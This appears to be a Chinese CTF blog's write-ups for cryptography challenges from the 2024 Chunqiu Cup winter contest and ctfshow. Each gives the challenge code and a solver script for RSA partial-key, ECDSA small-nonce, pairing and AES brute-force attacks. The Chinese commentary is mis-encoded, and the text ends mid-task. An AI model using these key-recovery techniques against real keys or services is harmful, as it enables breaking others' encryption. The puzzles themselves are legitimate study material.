","date":"2024-12-12","objectID":"/%E6%98%A5%E7%A7%8B%E6%9D%AF%E5%86%AC%E5%AD%A3%E8%B5%9B2024_crypto/:2:2","tags":["crypto"],"title":"æ˜¥ç§‹æ¯å†¬å­£èµ›2024_crypto","uri":"/%E6%98%A5%E7%A7%8B%E6%9D%AF%E5%86%AC%E5%AD%A3%E8%B5%9B2024_crypto/"},{"categories":["CTF"],"content":"RSA1 task from Crypto.Util.number import * import uuid p, q = [getPrime(512) for _ in range(2)] N = p * q flag = b'flag{' + str(uuid.uuid4()).encode() + b'}' flag += bin(getPrime((1024 - bytes_to_long(flag).bit_length()) // 8)).encode() m1 = bytes_to_long(flag) m2 = bytes_to_long(''.join(chr((ord(i) + 3) % 128) for i in flag.decode()).encode()) e = getPrime(128) c1 = pow(m1 * e, 2835, N) c2 = pow(m2, 2025, N) c3 = pow(m2, 2835, N) + e print(f'{N = }') print(f'{c1 = }') print(f'{c2 = }') print(f'{c3 = }') ''' N = 176871561120476589165761750300633332586877708342448994506175624203633860119621512318321172927876389631918300184221082317741380365447197777026256405312212716630617721606918066048995683899616059388173629437673018386590043053146712870572300799479269947118251011967950970286626852935438101046112260915112568392601 c1 = 47280375006817082521114885578132104427687384457963920263778661542552259860890075321953563867658233347930121507835612417278438979006705016537596357679038471176957659834155694284364682759675841808209812316094965393550509913984888849945421092463842546631228640293794745005338773574343676100121000764021207044019 c2 = 176231410933979134585886078013933649498379873444851943224935010972452769899603364686158279269197891190643725008151812150428808550310587709008683339436590112802756767140102136304346001599401670291938369014436170693864034099138767167055456635760196888578642643971920733784690410395944410255241615897032471127315 c3 = 135594807884016971356816423169128168727346102408490289623885211179619571354105102393658249292333179346497415129785184654008299725617668655640857318063992703265407162085178885733134590524577996093366819328960462500124201402816244104477018279673183368074374836717994805448310223434099196774685324616523478136309 ''' é¦–å…ˆeæ˜¯å¯ä»¥åˆ©ç”¨c2,c3å¤šé¡¹å¼ç›´æ¥æ±‚å‡ºæ¥çš„ï¼Œåé¢éƒ¨åˆ†æœ‰ç‚¹ç±»ä¼¼æ—¥æœ¬çš„é‚£ä¸ªrot13äº†ï¼Œä½†æ˜¯æ›´ç®€å•ï¼Œå·®å€¼ä¸ç”¨è‡ªå·±æ‰‹ç®—ï¼Œç›´æ¥ç”Ÿæˆm1å’Œm2å‡ä¸€ä¸‹å°±å¥½äº†ï¼Œç„¶åå°±æ˜¯hgcdçš„å¯Œå…°å…‹æ— N = 176871561120476589165761750300633332586877708342448994506175624203633860119621512318321172927876389631918300184221082317741380365447197777026256405312212716630617721606918066048995683899616059388173629437673018386590043053146712870572300799479269947118251011967950970286626852935438101046112260915112568392601 c1 = 47280375006817082521114885578132104427687384457963920263778661542552259860890075321953563867658233347930121507835612417278438979006705016537596357679038471176957659834155694284364682759675841808209812316094965393550509913984888849945421092463842546631228640293794745005338773574343676100121000764021207044019 c2 = 176231410933979134585886078013933649498379873444851943224935010972452769899603364686158279269197891190643725008151812150428808550310587709008683339436590112802756767140102136304346001599401670291938369014436170693864034099138767167055456635760196888578642643971920733784690410395944410255241615897032471127315 c3 = 135594807884016971356816423169128168727346102408490289623885211179619571354105102393658249292333179346497415129785184654008299725617668655640857318063992703265407162085178885733134590524577996093366819328960462500124201402816244104477018279673183368074374836717994805448310223434099196774685324616523478136309 from Crypto.Util.number import * import sys '''PR.\u003cx\u003e = PolynomialRing(Zmod(N)) f=(c3-x)^5-(c2)^7 res=f.monic().small_roots(X=2^128,beta=0.4,epsilon=0.02) print(res) ''' '''from Crypto.Util.number import * import uuid flag = b'flag{' + str(uuid.uuid4()).encode() + b'}' flag += bin(getPrime((1024 - bytes_to_long(flag).bit_length()) // 8)).encode() m1 = bytes_to_long(flag) m2 = bytes_to_long(''.join(chr((ord(i) + 3) % 128) for i in flag.decode()).encode()) print(m2-m1)''' e=281211879955223558268422413173406510291 b=138604255630984394504644405862999441108691457990544710059664868220625513430462483763119797291779992529360824019886958759717736876661453044335745573603330761817432828924688993026332102549607397901351619425324993583087500714061523945925857368498922102768458574857510324727265052999967460998294909713988129273348867 def HGCD(a, b): if 2 * b.degree() \u003c= a.degree(","date":"2024-12-12","objectID":"/%E6%98%A5%E7%A7%8B%E6%9D%AF%E5%86%AC%E5%AD%A3%E8%B5%9B2024_crypto/:2:3","tags":["crypto"],"title":"æ˜¥ç§‹æ¯å†¬å­£èµ›2024_crypto","uri":"/%E6%98%A5%E7%A7%8B%E6%9D%AF%E5%86%AC%E5%AD%A3%E8%B5%9B2024_crypto/"},{"categories":["CTF"],"content":"factor task import random import os from Crypto.Util.number import * from secret import flag def pad(x, n): while len(x) \u003c n // 8: x += os.urandom(1) return x def genp(p, l): while 1: r = random.randint(1 \u003c\u003c l - 1, 1 \u003c\u003c l) if isPrime(p + r): return p + r bits = 1024 b = 345 flag = pad(flag, bits * 3) m = bytes_to_long(flag) p = getPrime(bits) q = genp(p, b) r = genp(q, b) n = p * q * r print(n) print(pow(m, 65537, n)) # 5605777780127871552103278440489930168557569118966981388111283042550796167470265465148458919374665519335013101681890408413810351780671950283765145543168779446153786190869731166707967097095246677053262868926963631796027692694223765625053269102325714361312299011876036815423751522482629914361369303649193526946050137701205931577449326939722902280884984494828850611521784382097900268639648421100760612558110614208245291400961758972415881709281708443424129033685255718996719201537066717587527029554871540574867831957154286334639399985379381455084604901293000229526196544921067214723085504463673412082637877637982771445298815007769526806112008703908400170846707986989384244531990469279604588770393462375930699135443458952703826608237292999895910024613311408883134789788541751697007502656798556053417265191533053158952284994030769145926816478390761642058013769635850833893158830591398862163134753203291719549474871116653745337968227 # 2998195560453407057321637509862236387961676411996988529185696118404592349869917006166370346762261303282478779647282039317061146533808487789458703169149689179547543732935053220010550004328207373171271534689897340156346458951776319267981966893926724550629182100766890856964207263709029611781806548130358294543573874132473259788387939849997550651614987993962540192023207354839106090274252125961835070701748643163379053118598595995782448140944376681636633592442158453965800439960134688017496184195454406927204485213436540382637720118180670197194949275760000729877093621741313147190401896114633643891311672542703928421032698499968701052818985292683628072129271790220674145955527935027879112279336148316425115255710066132502392447843608711463775710558880259205308541126041959858947252063815158749021817255637836170676726466347847422352280599210078359786387419424076245960344657767332883964636288493649066530215094453490169688507988 ä¸‰å…ƒcopperï¼Œpqræ¥è¿‘ï¼Œç›´æ¥æŠŠnå¼€ä¸‰æ¬¡æ ¹å· import itertools from Crypto.Util.number import * import gmpy2 from tqdm import trange def small_roots(f, bounds, m=1, d=None): if not d: d = f.degree() R = f.base_ring() N = R.cardinality() #å–å¾—æ¨¡æ•° f /= f.coefficients().pop(0) #æœ€é«˜æ¬¡é¡¹ç³»æ•°åŒ–ä¸º0ï¼Œcoefficientsæ˜¯å¤šé¡¹å¼çš„é™æ¬¡å¹‚æ’åˆ—ç³»æ•° f = f.change_ring(ZZ) G = Sequence([], f.parent()) for i in range(m + 1): base = N ^ (m - i) * f ^ i #æ”¶é›†åŸºå¤šé¡¹å¼ for shifts in itertools.product(range(d), repeat=f.nvariables()): g = base * prod(map(power, f.variables(), shifts)) G.append(g) print(G) B, monomials = G.coefficient_matrix() monomials = vector(monomials) factors = [monomial(*bounds) for monomial in monomials] for i, factor in enumerate(factors): B.rescale_col(i, factor) B = B.dense_matrix().LLL() B = B.change_ring(QQ) for i, factor in enumerate(factors): B.rescale_col(i, 1 / factor) H = Sequence([], f.parent().change_ring(QQ)) for h in filter(None, B * monomials): H.append(h) I = H.ideal() if I.dimension() == -1: H.pop() elif I.dimension() == 0: roots = [] for root in I.variety(ring=ZZ): root = tuple(R(root[var]) for var in f.variables()) roots.append(root) return roots return [] n=560577778012787155210327844048993016855756911896698138811128304255079616747026546514845891937466551933501310168189040841381035178067195028376514554316877944615378619086973116670796709709524667705326286892696363179602769269422376562505326910232571436131229901187603681542375152248262991436136930364919352694605013770120593157744932693972290228088498449482885061152178438209790026863964842110076061255811061420824529140096175897241588170928170844342412903368525571899671920153706671758752702955487154057486783195715428633463939998537938145508460490129300022952619654492106721472308550","date":"2024-12-12","objectID":"/%E6%98%A5%E7%A7%8B%E6%9D%AF%E5%86%AC%E5%AD%A3%E8%B5%9B2024_crypto/:2:4","tags":["crypto"],"title":"æ˜¥ç§‹æ¯å†¬å­£èµ›2024_crypto","uri":"/%E6%98%A5%E7%A7%8B%E6%9D%AF%E5%86%AC%E5%AD%A3%E8%B5%9B2024_crypto/"},{"categories":["CTF"],"content":"funny_rsa task import random import libnum from Crypto.Util.number import bytes_to_long, long_to_bytes print(\"Welcome to ChunqiuCTF Game!\") print(\"æ¥ä¸‹æ¥å®Œæˆä¸‹é¢çš„æŒ‘æˆ˜\") print(\"Good luck!\") # funny hint = b' ' m = b' ' p = libnum.generate_prime(1024) q = libnum.generate_prime(1024) n = p * q print(\"give you some funny numbers\") # funny 1 print(p+q - p*q + random.randint(-1025, +1025)) # funny 2 print(bytes_to_long(m)*bytes_to_long(hint)) # funny 3 print(bytes_to_long(m)*n*bytes_to_long(hint) - 1025) # funny 4 print(pow(bytes_to_long(hint), 65537, n)) a=-17696257697673533517695215344482784803953262308315416688683426036407670627060768442028628137969719289734388098357659521255966031131390425549974547376165392147394271974280020234101031837837842620775164967619688351222631803585213762205793801828461058523503457022704948803795360591719481537859524689187847958423587638744086265395438163720708785636319741908901866136858161996560525252461619641697255819255661269266471689541673348377717503957328827459396677344554172542244540931545166846117626585580964318010181586516365891413041095399344533013057011854734701706641516027767197631044458866554524544179750101814734153116374 b=23686728880494758233026798487859622755203105120130180108222733038275788082047755828771429849079142070779731875136837978862880500205129022165600511611807590195341629179443057553694284913974985006590617143873019530710952420242412437467917519539591683898715990297750494900923245055632544763410401540518654522017115269508183482044872091052235608170710105631742176900306097734799793264202179181242015892763311753674799273300604804820015447161950996038795518844564861004398396796284113803759208011 c=419166458284161364374927086939132546372091965414091344286510440034452974193054721041229068769658972346759176374539266235862042787888391905466876330331208651698002159575012622762558316612596034044109738533275009086940744966244759977014078484433213617582101347769476703012517531619023366639507114909172774156647998737369356116119513795863130218094614475699956104117183821832339358478426978211282822163928764161915824622224165694904342224081321345691796882691318330781141960650263488927837990954860719950761728580780956673732592771855694502630374907978111094148614378212006604233062606116168868545120407836000858982789824582335703891535021579560434875457656655941164757860852341484554015214879991896412137447010444797452119431147303295803678311972500421396900616845556636124424993090559354406417222700637726789045926994792374756038517484548544506630672251868349748176389591615802039026216656891403871728516658502023897343287181822303758976641229952646993446276281728919020747050486979968215989594984778920359425264076558022228448529089047021814759587052098774273578311709416672952218680244714492318709603579024 d=13541898381047120826573743874105965191304100799517820464813250201030319771155430755606644860103469823030581858410957600027665504533335597988508084284252510961847999525811558651340906333101248760970154440885012717108131962658921396549020943832983712611749095468180648011521808106480590665594160479324931351996812185581193608244652792936715504284312172734662364676167010674359243219959129435127950232321130725013160026977752389409620674167037650367196748592335698164875097139931376389630867192761783936757260359606379088577977154378217235326249540098268616890307702288393952949444753648206049856544634755301197410481479 ç¥äººé¢˜ç›®ï¼Œæ±‚å‡ºåæ˜¯fakeflagï¼ŒæŠŠé‡Œé¢çš„æ•°æ‹‰å‡ºæ¥å†è½¬ä¸€ä¸‹ b=23686728880494758233026798487859622755203105120130180108222733038275788082047755828771429849079142070779731875136837978862880500205129022165600511611807590195341629179443057553694284913974985006590617143873019530710952420242412437467917519539591683898715990297750494900923245055632544763410401540518654522017115269508183482044872091052235608170710105631742176900306097734799793264202179181242015892763311753674799273300604804820015447161950996038795518844564861004398396796284113803759208011 c=419166458284161364374927086939132546372091965414091344286510440034452974193054721","date":"2024-12-12","objectID":"/%E6%98%A5%E7%A7%8B%E6%9D%AF%E5%86%AC%E5%AD%A3%E8%B5%9B2024_crypto/:2:5","tags":["crypto"],"title":"æ˜¥ç§‹æ¯å†¬å­£èµ›2024_crypto","uri":"/%E6%98%A5%E7%A7%8B%E6%9D%AF%E5%86%AC%E5%AD%A3%E8%B5%9B2024_crypto/"},{"categories":["CTF"],"content":"EZ_rsa task from secret import flag from Crypto.Util.number import * import hashlib p = getPrime(512) q = getPrime(512) N = p * q e = getPrime(1023) assert e \u003c N c = pow(bytes_to_long(flag), e, N) print(f'{N = }') print(f'{e = }') print(f'{c = }') phi = (p - 1) * (q - 1) d = inverse(e, phi) k = (e * d - 1) // phi dh = d \u003e\u003e 234 dl = d % pow(2, 24) kh = k \u003e\u003e 999 hash224 = bytes_to_long(hashlib.sha224(long_to_bytes(dl)).digest()) hash512 = bytes_to_long(hashlib.sha512(long_to_bytes(kh)).digest()) leak = hash224 ^ hash512 ^ (k % pow(2, 512)) print(f'{dh = }') print(f'{leak = }') ''' N = 136118062754183389745310564810647775266982676548047737735816992637554134173584848603639466464742356367710495866667096829923708012429655117288119142397966759435369796296519879851106832954992705045187415658986211525671137762731976849094686834222367125196467449367851805003704233320272315754132109804930069754909 e = 84535510470616870286532166161640751551050308780129888352717168230068335698416787047431513418926383858925725335047735841034775106751946839596675772454042961048327194226031173378872580065568452305222770543163564100989527239870852223343451888139802496983605150231009547594049003160603704776585654802288319835839 c = 33745401996968966125635182001303085430914839302716417610841429593849273978442350942630172006035442091942958947937532529202276212995044284510510725187795271653040111323072540459883317296470560328421002809817807686065821857470217309420073434521024668676234556811305412689715656908592843647993803972375716032906 dh = 4640688526301435859021440727129799022671839221457908177477494774081091121794107526784960489513468813917071906410636566370999080603260865728323300663211132743906763686754869052054190200779414682351769446970834390388398743976589588812203933 leak = 12097621642342138576471965047192766550499613568690540866008318074007729495429051811080620384167050353010748708981244471992693663360941733033307618896919023 ''' å’Œsuçš„ç±»ä¼¼ï¼Œå…ˆæ‹¿åˆ°ké«˜ä½ï¼Œç„¶åé€šè¿‡då»æ±‚å‡ºå®Œæ•´çš„kï¼Œp+q=N+1-K**(-1) mod e,eæ˜¯1023bitsï¼Œå°±æ˜¯å®Œæ•´çš„p+qäº† from Crypto.Util.number import* import hashlib from tqdm import trange n = 136118062754183389745310564810647775266982676548047737735816992637554134173584848603639466464742356367710495866667096829923708012429655117288119142397966759435369796296519879851106832954992705045187415658986211525671137762731976849094686834222367125196467449367851805003704233320272315754132109804930069754909 e = 84535510470616870286532166161640751551050308780129888352717168230068335698416787047431513418926383858925725335047735841034775106751946839596675772454042961048327194226031173378872580065568452305222770543163564100989527239870852223343451888139802496983605150231009547594049003160603704776585654802288319835839 c = 33745401996968966125635182001303085430914839302716417610841429593849273978442350942630172006035442091942958947937532529202276212995044284510510725187795271653040111323072540459883317296470560328421002809817807686065821857470217309420073434521024668676234556811305412689715656908592843647993803972375716032906 dh = 4640688526301435859021440727129799022671839221457908177477494774081091121794107526784960489513468813917071906410636566370999080603260865728323300663211132743906763686754869052054190200779414682351769446970834390388398743976589588812203933 leak = 12097621642342138576471965047192766550499613568690540866008318074007729495429051811080620384167050353010748708981244471992693663360941733033307618896919023 dh=dh\u003c\u003c234 k_=(e*dh-1)//n kh=k_\u003e\u003e999 khh=k_\u003e\u003e512 khh+=1 khh=khh\u003c\u003c512 hash512=bytes_to_long(hashlib.sha512(long_to_bytes(kh)).digest()) def findpq(range): low=range[0] high=range[1] for dl in trange(low,high): hash224=bytes_to_long(hashlib.sha224(long_to_bytes(dl)).digest()) kl=leak^^hash224^^hash512 k=khh+kl kinv=inverse(k,e) s=(n+1+kinv)%e if 511\u003c=int(s).bit_length()\u003c=515: var('p,q') eq1=p+q==s eq2=p*q==n res=solve([eq1,eq2],[p,q]) print(res) break ranges=[(i,i+524288) for i in range(0,2^24,524288)] from multiprocessing import Pool with Pool(32) as pool: r=list(pool.i","date":"2024-12-12","objectID":"/%E6%98%A5%E7%A7%8B%E6%9D%AF%E5%86%AC%E5%AD%A3%E8%B5%9B2024_crypto/:2:6","tags":["crypto"],"title":"æ˜¥ç§‹æ¯å†¬å­£èµ›2024_crypto","uri":"/%E6%98%A5%E7%A7%8B%E6%9D%AF%E5%86%AC%E5%AD%A3%E8%B5%9B2024_crypto/"},{"categories":["CTF"],"content":"running task from Crypto.Cipher import AES from Crypto.Util.Padding import pad from hashlib import md5 from secret import flag K=5 p=[2, 3, 5, 7, 11, 13, 17, 19, 23, 29, 31, 37, 41] while i:=i+1: if all([0,i][sum([0,j][i%j==0]for j in range(1,i+1))\u003e2*i]%j for j in p[:K]):print(AES.new(key=md5(str(i).encode()).digest(),mode=AES.MODE_ECB).encrypt(pad(flag,16)));break # b'y.\\x86k\\xbd\\xbfd7)\\xcdHm\\xf7\\x1e\\xfdX\\xf6z\\xb0\\xd5XD}\\xe8m\\x81D\\x84\\x1c\\xa0\u003c\\x1f\\xd0f\\x9f\\xcc\\x89\\r\\xc4\\x9d\\xadbY\\xa3\\xb1\\x1d5?' Abundant Numbersçš„ä¸°åº¦5ï¼Œç›´æ¥çœ‹è®ºæ–‡ï¼ŒæŠŠé‡Œé¢çš„æ•°æ®ä¸€ä¸ªä¸€ä¸ªè¯• https://projecteuclid.org/journals/bulletin-of-the-belgian-mathematical-society-simon-stevin/volume-12/issue-1/On-the-smallest-abundant-number-not-divisible-by-the-first/10.36045/bbms/1113318127.full?tab=ArticleFirstPage c=b'y.\\x86k\\xbd\\xbfd7)\\xcdHm\\xf7\\x1e\\xfdX\\xf6z\\xb0\\xd5XD}\\xe8m\\x81D\\x84\\x1c\\xa0\u003c\\x1f\\xd0f\\x9f\\xcc\\x89\\r\\xc4\\x9d\\xadbY\\xa3\\xb1\\x1d5?' from Crypto.Cipher import AES from Crypto.Util.Padding import pad from hashlib import md5 from Crypto.Util.number import * primes=[] for i in range(350): if isPrime(i): primes.append(i) k=17**2*19**2*23**2 for i in primes[9:]: k*=i flag=AES.new(key=md5(str(k).encode()).digest(),mode=AES.MODE_ECB).decrypt(c) print(flag) ","date":"2024-12-12","objectID":"/%E6%98%A5%E7%A7%8B%E6%9D%AF%E5%86%AC%E5%AD%A3%E8%B5%9B2024_crypto/:2:7","tags":["crypto"],"title":"æ˜¥ç§‹æ¯å†¬å­£èµ›2024_crypto","uri":"/%E6%98%A5%E7%A7%8B%E6%9D%AF%E5%86%AC%E5%AD%A3%E8%B5%9B2024_crypto/"},{"categories":["CTF"],"content":"signtime task from hashlib import sha1 from Crypto.Util.number import bytes_to_long from ecdsa.ecdsa import Public_key, Private_key, Signature, generator_192 from datetime import datetime from random import randrange banner = \"\"\" // / / // ) ) // ) ) // ) ) // | | //____ // // / / (( //__| | / ____ // // / / \\\\ / ___ | // // // / / ) ) // | | //____/ / ((____/ / //____/ / ((___ / / // | | Welcome to this CTF challenge! you have THREE choices: - sign_time to get a signature - verify to verify the signature - I kown the secret to get the flag You only have TWO chances per connection. Best wish for you! \"\"\" generator = generator_192 order = generator.order() hint_message = '' flag_content = '' private_key_value = randrange(1, order - 1) public_key = Public_key(generator, generator * private_key_value) private_key = Private_key(public_key, private_key_value) def sign_current_time(): current_time = datetime.now() current_month = int(current_time.strftime(\"%m\")) current_seconds = int(current_time.strftime(\"%S\")) formatted_time = f\"{current_month}:{current_seconds}\" message = f\"The time is {formatted_time}\" message_hash = sha1(message.encode()).digest() signature = private_key.sign(bytes_to_long(message_hash), randrange(100, 100 + current_seconds)) return {\"time\": message, \"r\": hex(signature.r), \"s\": hex(signature.s)} def verify_signature(): user_message = input(\"Enter the message: \") user_r = input(\"Enter r in hexadecimal form: \") user_s = input(\"Enter s in hexadecimal form: \") message_hash = sha1(user_message.encode()).digest() signature_r = int(user_r, 16) signature_s = int(user_s, 16) signature = Signature(signature_r, signature_s) return public_key.verifies(bytes_to_long(message_hash), signature) def start_challenge(): print(banner) for _ in range(2): user_choice = input(\"Enter your option: \") if user_choice == 'sign_time': print(sign_current_time()) elif user_choice == 'verify': if verify_signature(): print(f\"The hint is: {hint_message}\") exit(0) else: print(\"Signature verification failed.\") elif user_choice == 'I kown the secret': if input(\"Enter the secret: \") == hex(private_key_value): print(f\"The flag is: {flag_content}\") exit(0) else: print(\"Invalid option!\") if __name__ == \"__main__\": start_challenge() ECDSAç­¾åç®—æ³•ï¼Œé€šè¿‡æ—¶é—´æˆ³æ¥ç­¾åï¼Œç„¶åé€šè¿‡éªŒè¯ç­¾åæ¥è·å–flag signature = private_key.sign(bytes_to_long(message_hash), randrange(100, 100 + current_seconds)) ä¼ å…¥çš„æ˜¯hashå’Œkï¼Œkå¾ˆå°ï¼Œç›´æ¥çˆ†ç ´ from hashlib import sha1 from Crypto.Util.number import * from ecdsa.ecdsa import Public_key, Private_key, Signature, generator_192 from pwn import * r=remote('',) r.recvuntil(b\"Enter your option: \") r.sendline(b\"sign_time\") a=eval(r.recvline().split().decode()) message=a['time'] r=eval(a['r']) s=eval(a['s']) generator = generator_192 order = generator.order() message_hash=bytes_to_long(sha1(message.encode()).digest()) sign=Signature(r,s) for k in range(100,160): d=(k*s-message_hash)*inverse(r,order)%order public_key=Public_key(generator,generator*d) private_key=Private_key(public_key,d) if private_key.verify(message_hash,sign): print(k) print(d) m=hex(d) r.sendline(b\"I kown the secret\") r.sendlineafter(b\"Enter the secret: \",m.encode()) r.interactive() break ","date":"2024-12-12","objectID":"/%E6%98%A5%E7%A7%8B%E6%9D%AF%E5%86%AC%E5%AD%A3%E8%B5%9B2024_crypto/:2:8","tags":["crypto"],"title":"æ˜¥ç§‹æ¯å†¬å­£èµ›2024_crypto","uri":"/%E6%98%A5%E7%A7%8B%E6%9D%AF%E5%86%AC%E5%AD%A3%E8%B5%9B2024_crypto/"},{"categories":["CTF"],"content":"dance task from Crypto.Util.number import * from secret import flag m = [int(i) for i in bin(bytes_to_long(flag))[2:].zfill(len(flag) * 8)] p = 0x1A0111EA397FE69A4B1BA7B6434BACD764774B84F38512BF6730D2A0F6B0F6241EABFFFEB153FFFFB9FEFFFFFFFFAAAB E = EllipticCurve(GF(p), [0, 4]) G1, G2 = E.gens() o1, o2 = G1.order(), G2.order() r = [randint(1, o1 - 1) for _ in range(len(m) + 1)] c = [] for i in range(len(m)): A = r[i] * G1 + m[i] * G2 B = m[i] * G1 + r[i + 1] * G2 c.extend(A + B) open(\"out.txt\", \"w\").write(f\"c = {c}\") suä¹Ÿæ˜¯è¿™ç§ç±»å‹çš„é¢˜ç›®ï¼ŒåŒçº¿æ€§é…å¯¹ï¼ŒG1å’ŒG2å·²çŸ¥ï¼Œflagå¤´å‰å‡ ä¸ªbitsä¹ŸçŸ¥é“ï¼Œ from Crypto.Util.number import * p = 0x1A0111EA397FE69A4B1BA7B6434BACD764774B84F38512BF6730D2A0F6B0F6241EABFFFEB153FFFFB9FEFFFFFFFFAAAB K=GF(p) E = EllipticCurve(K, [0, 4]) o=793479390729215512516507951283169066088130679960393952059283337873017453583023682367384822284289 G1, G2 = E.gens() out=eval(open('out.txt','r').read().split('=')[-1]) cs=[] for i in range(0,len(out),3): c=(out[i],out[i+1],out[i+2]) cs.append(E(c)) T=G1.weil_pairing(G2,o) m='0' for i in range(1,len(cs)): now=m[i-1] ci=cs[i-1] cii=cs[i] Ti=G1.weil_pairing(ci,o) Tii=G2.weil_pairing(cii,o) tmp=Ti*Tii % p if tmp==1: m+=now else: m+=str(1-int(now)) flag=long_to_bytes(int(m,2)) print(flag) ","date":"2024-12-12","objectID":"/%E6%98%A5%E7%A7%8B%E6%9D%AF%E5%86%AC%E5%AD%A3%E8%B5%9B2024_crypto/:2:9","tags":["crypto"],"title":"æ˜¥ç§‹æ¯å†¬å­£èµ›2024_crypto","uri":"/%E6%98%A5%E7%A7%8B%E6%9D%AF%E5%86%AC%E5%AD%A3%E8%B5%9B2024_crypto/"},{"categories":["CTF"],"content":"right_data task from Crypto.Util.number import * from secret import flag from random import shuffle modulus = 257 key = list(flag) with open(\"output.txt\", \"w\") as f: for k in range(0, len(key)): key1 = getRandomRange(1, modulus) key2 = (key[k] + key1) % modulus coefs = [] for _ in range((modulus - 1) ** 2 - 1): c1, c2, c3 = ( getRandomRange(1, modulus), getRandomRange(1, modulus), getRandomRange(1, modulus), ) coefs.append(c1, c2, (c1 * key1 + c2 * key2 + c3) % modulus) shuffle(coefs) for i in coefs: s = str(i[0]) + \" \" + str(i[1]) + \" \" + str(i[2]) f.write(s + \"\\n\") keyéƒ½æ˜¯å°å€¼ï¼Œå¯ä»¥çˆ†ç ´ from Crypto.Util.number import * from tqdm import * def findxyy(x,y): for i in range(65535): if ((x*C1[i]+y*C2[i])%257 == Value[i] ): return False return True def findm(): for x in range(1,257): for y in range(1,257): if findxyy(x,y): m=(y-x)%257 return chr(m) f=open('output.txt','r') flag=\"\" for _ in range(42): C1=[] C2=[] Value=[] for i in range(65535): tmp=f.readline().split(' ') c1=int(tmp[0]) c2=int(tmp[1]) value=int(tmp[2]) C1.append(c1) C2.append(c2) Value.append(value) flag+=findm() print(flag) ","date":"2024-12-12","objectID":"/%E6%98%A5%E7%A7%8B%E6%9D%AF%E5%86%AC%E5%AD%A3%E8%B5%9B2024_crypto/:2:10","tags":["crypto"],"title":"æ˜¥ç§‹æ¯å†¬å­£èµ›2024_crypto","uri":"/%E6%98%A5%E7%A7%8B%E6%9D%AF%E5%86%AC%E5%AD%A3%E8%B5%9B2024_crypto/"},{"categories":["CTF"],"content":"å‰è¨€ é¢ï¼Œå¥½åƒæ˜¯èšé¤çš„æ—¶å€™æ‰çŸ¥é“æœ‰è¿™ä¸ªæ¯”èµ›ï¼Œæ‰“çš„æ—¶å€™å·²ç»è¦ç»“æŸäº†ï¼Œå¤ç°ä¸€ä¸‹ é¢˜ç›® å¥‡å¥‡æ€ªæ€ªçš„æ¡å½¢ç  èƒ½éšéšçº¦çº¦çœ‹å‡ºæ¥é‡Œé¢æ˜¯å­—æ¯å’Œæ•°å­—ï¼Œä¸€ä¸ªä¸€ä¸ªå†™å‡ºæ¥æ‰”åˆ°éšæ³¢é€æµé‡Œé¢æ¢­å“ˆå°±è¡Œäº†ã€‚ factor task from Crypto.Util.number import * import gmpy2 import os from enc import flag hint = os.urandom(36) tmp = bytes_to_long(hint) m = bytes_to_long(flag) p = getPrime(512) q = getPrime(512) d = getPrime(400) phi = (p-1)(q-1) e = gmpy2.invert(d,phi) n = pq c = pow(m,e,n) leak1 = p^tmp leak2 = q^tmp print(f\"n = {n}\") print(f\"e = {e}\") print(f\"c = {c}\") print(f\"leak1 = {leak1}\") print(f\"leak2 = {leak2}\") æ€è·¯ æˆ‘ä»¬å·²çŸ¥leak1=p^temp,leak2=q^temp,é‚£ä¹ˆp^q=leak1^leak2ï¼Œé‚£ä¹ˆå°±å˜æˆäº†æœ€ç»å…¸çš„å‰ªæçˆ†ç ´ï¼Œå¥—ç”¨è„šæœ¬å°±å¯ä»¥å†™å‡ºæ¥äº†ã€‚è²Œä¼¼è¿™ä¸ªnå¯ä»¥ç›´æ¥åˆ†è§£ï¼Œä¹Ÿå¯ä»¥å†™å‡ºæ¥ï¼ˆï¼‰ exp n= e= c= leak1= leak2= from Crypto.Util.number import* leak=leak1^leak2 leak_bits = 512 xor = bin(leak)[2:].zfill(512) pq = [] def pq_high_xor(p=\"\", q=\"\"): lp, lq = len(p), len(q) tp0 = int(p + (512-lp) * \"0\", 2) tq0 = int(q + (512-lq) * \"0\", 2) tp1 = int(p + (512-lp) * \"1\", 2) tq1 = int(q + (512-lq) * \"1\", 2) if tp0 * tq0 \u003e n or tp1 * tq1 \u003c n: return if lp == leak_bits: pq.append(tp0) return if xor[lp] == \"1\": pq_high_xor(p + \"0\", q + \"1\") pq_high_xor(p + \"1\", q + \"0\") else: pq_high_xor(p + \"0\", q + \"0\") pq_high_xor(p + \"1\", q + \"1\") pq_high_xor() print(pq) p= q= phi=(p-1)*(q-1) d=inverse(e,phi) m=pow(c,d,n) print(long_to_bytes(m)) ç»™ä½ dåˆæ€æ · task from Crypto.Util.number import * from gmpy2 import * flag=â€œctfshow{*}â€ m=bytes_to_long(flag.encode()) e=65537 p=getPrime(128) q=getPrime(128) n=pq phin=(p-1)(q-1) d=invert(e,phin) c=pow(m,e,n) print(â€œc=\",c) print(â€œhint=\",pow(n,e,c)) print(â€œe=\",e) print(â€œd=\",d) æ€è·¯ æŠŠnçœ‹ä½œa+c,é‚£ä¹ˆne mod c=ae mod cï¼Œè¿™ä¸€æ­¥å°±æ˜¯äºŒé¡¹å¼å®šç†ï¼Œå±•å¼€ä¹‹ååçš„é¡¹ä¸€å®šä¼šæœ‰cï¼Œé‚£ä¹ˆmod cæ—¶å°±ä¼šç›´æ¥çº¦å»ï¼Œè¿™ä¸ªæ—¶å€™ç›´æ¥å»ç®—açš„å¤§å°ï¼Œnå°±å‡ºæ¥äº† exp c= hint= e= d= from Crypto.Util.number import * phic=euler_phi(c) dc=inverse_mod(e,phic) a=pow(hint,dc,c) n=int(a)+int(c) m=power_mod(c,d,n) print(long_to_bytes(m)) ç®€å•å¯†ç  task 647669776d757e83817372816e707479707c888789757c92788d84838b878d9d æ€è·¯ ç¬¬ä¸€çœ¼çœ‹ä¸Šå»åƒæ˜¯16è¿›åˆ¶çš„ä¸œè¥¿ï¼Œæƒ³ç€ç›´æ¥è½¬æ¢ï¼Œæ²¡æœ‰å‡ºæ¥ï¼Œç„¶åçœ‹äº†çœ‹ctfshowè¿™ä¸ªå‰ç¼€ï¼Œå‘ç° ctfshowï¼ˆhexä¸€ä¸‹ï¼‰ 63 74 66 73 68 6f 77 64 76 69 77 6d 75 7e 83817372816e707479707c888789757c92788d84838b878d9d è¿™ä¸ªè§„å¾‹å°±å‡ºæ¥äº† exp a=0x647669776d757e83817372816e707479707c888789757c92788d84838b878d9d from Crypto.Util.number import* cnt=1 for i in long_to_bytes(a): print(chr(i-cnt),end='') cnt=cnt+1 æ··åˆå¯†ç ä½“ç³» Â  task from Crypto.Util.number import bytes_to_long,getPrime from Crypto.Cipher import AES from Crypto.Util.Padding import pad # å¯¹ç§°åŠ å¯† flag = b'ctfshow{***}' # 